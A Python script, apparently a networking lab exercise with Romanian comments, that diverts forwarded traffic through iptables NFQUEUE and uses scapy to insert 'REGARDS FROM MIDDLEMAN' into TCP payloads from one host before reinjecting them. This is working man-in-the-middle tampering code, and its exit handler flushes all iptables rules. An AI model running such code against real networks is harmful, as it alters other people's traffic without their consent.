import os
from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ

messages = []

def insert_custom_message(message):
    return message[:5] + " REGARDS FROM MIDDLEMAN " + message[5:]


def alter_packet(pachet):
    global messages
    if pachet.haslayer(IP) and pachet.haslayer(Raw): 
        if pachet[Raw].load not in messages:
            messages.append(pachet[Raw].load) 
            if pachet[IP].src == '198.7.0.1': 
                pachet[IP].tos = 3
                current_mesage = pachet[Raw].load
                new_message = insert_custom_message(str(current_mesage.decode('utf-8')))
                pachet[Raw].load = bytes(new_message, 'utf-8')
                del pachet[IP].chksum
                del pachet[IP].len
                del pachet[TCP].chksum
        return True, pachet
    # intorc False si 1 daca pachetul nu a fost modificat deloc, pentru a evita exceptia de la IP(scapy_packet.build())
    return False, None 
def proceseaza(pachet):
    octeti = pachet.get_payload()
    scapy_packet = IP(octeti)
    print("Pachet inainte:  " )
    scapy_packet.show()
    modified, scapy_packet = alter_packet(scapy_packet)
    if not modified:
        # este pachet de tip reply ARP etc.
        pachet.accept()
        return 


    scapy_packet = IP(scapy_packet.build())

    print("Pachet dupa:  " )
    scapy_packet.show()

    pachet.set_payload(bytes(scapy_packet))
    pachet.accept()
    print('pachet acceptat')

queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 3 --queue-bypass")
    queue.bind(3, proceseaza)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()